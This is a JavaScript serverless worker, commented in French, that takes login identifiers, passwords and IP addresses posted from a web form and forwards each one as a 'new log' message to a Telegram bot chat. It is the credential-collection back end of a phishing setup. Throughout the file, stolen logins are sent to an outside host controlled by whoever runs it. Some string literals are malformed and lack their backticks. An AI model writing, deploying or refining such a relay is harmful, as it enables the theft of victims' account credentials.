export default {
  async fetch(request, env) {
    // 1. Configuration des Headers CORS (pour autoriser l'envoi depuis votre site)
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    // 2. Gestion de la requête de pré-vérification (OPTIONS) du navigateur
    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    // 3. Traitement de l'envoi des données (POST)
    if (request.method === "POST") {
      try {
        // Lecture des données envoyées par votre formulaire HTML
        const data = await request.json();

        // Récupération de vos secrets (configurés dans l'onglet Settings > Variables)
        const token = env.TELEGRAM_TOKEN;
        const chatId = env.TELEGRAM_CHAT_ID;

        // Préparation du message Telegram
        // Note : On utilise les noms de champs 'identifiant' et 'password'
        const messageText = 📩 **Nouveau Log Reçu**\n +
                            ━━━━━━━━━━━━━━\n +
                            👤 **ID :** ${data.identifiant || 'Non fourni'}\n +
                            🔑 **Pass :** \${data.password || 'Non fourni'}\\n +
                   IP : 🌐 **IP :** ${data.ip || 'Inconnue'}\n +
                            ━━━━━━━━━━━━━━;

        // Envoi vers l'API Telegram
        const telegramUrl = https://api.telegram.org/bot${token}/sendMessage;
        
        const telegramResponse = await fetch(telegramUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: messageText,
            parse_mode: "Markdown"
          })
        });

        // Réponse au site web pour confirmer que c'est bien parti
        return new Response(JSON.stringify({ success: true }), {
          status: 200,
          headers: { ...corsHeaders, "Content-Type": "application/json" }
        });

      } catch (err) {
        // En cas d'erreur de lecture des données
        return new Response(JSON.stringify({ error: "Erreur de traitement" }), {
          status: 500,
          headers: corsHeaders
        });
      }
    }

    // Si quelqu'un essaie d'accéder au lien directement dans un navigateur
    return new Response("Accès non autorisé", { status: 403 });
  }
};